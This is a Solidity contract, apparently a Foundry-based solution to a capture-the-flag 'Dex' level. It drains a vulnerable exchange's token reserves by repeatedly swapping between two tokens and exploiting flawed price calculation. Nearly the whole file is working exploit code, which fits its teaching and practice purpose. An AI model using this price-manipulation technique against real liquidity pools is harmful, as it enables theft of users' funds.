pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

interface IDex{
    function token1() external returns(address);
    function token2() external returns(address);
    function swap(address from, address to, uint amount) external;
    function getSwapPrice(address from, address to, uint amount) external view returns(uint);    
    function balanceOf(address token, address account) external view returns (uint);
    function approve(address spender, uint amount) external;
}

contract AttackDex{        
    IDex public dex;    
    address public token1;
    address public token2;

    constructor(address _victim) {
        dex = IDex(_victim);
        token1 = dex.token1();
        token2 = dex.token2();
    }
    
    function lowerboundSwap(address from, address to, uint amount) private {
        bool exceedsReserves =  (dex.getSwapPrice(from, to, amount) > dex.balanceOf(to,address(dex)));
        uint newAmount = exceedsReserves ? dex.balanceOf(from,address(dex)) : amount;
        dex.swap(from ,to, newAmount);        
    }

    function attack() public {        
        //before this step, player needs to send tx to approve coins for this attacker contract to use       
        //transfer all coins from player to this attacker contract  
        IERC20(token1).transferFrom(msg.sender, address(this), IERC20(token1).balanceOf(msg.sender));
        IERC20(token2).transferFrom(msg.sender, address(this), IERC20(token2).balanceOf(msg.sender));                

        dex.approve(address(dex), 9999); //allow dex contract to use our attacker's tokens
        
        //start player where all in token1
        address tokenFrom = token2;
        address tokenTo = token1;
        console.log("Printing coin balances in DEX contract");
        while ((dex.balanceOf(token1,address(dex)) > 0)&&(dex.balanceOf(token2,address(dex)) > 0)) {            
            lowerboundSwap(tokenFrom, tokenTo, dex.balanceOf(tokenFrom,address(this)));
            (tokenFrom, tokenTo) = (tokenTo, tokenFrom);

            console.log("------");
            console.log("token1:", dex.balanceOf(token1,address(dex)));
            console.log("token2:", dex.balanceOf(token2,address(dex)));
        }

    }
}
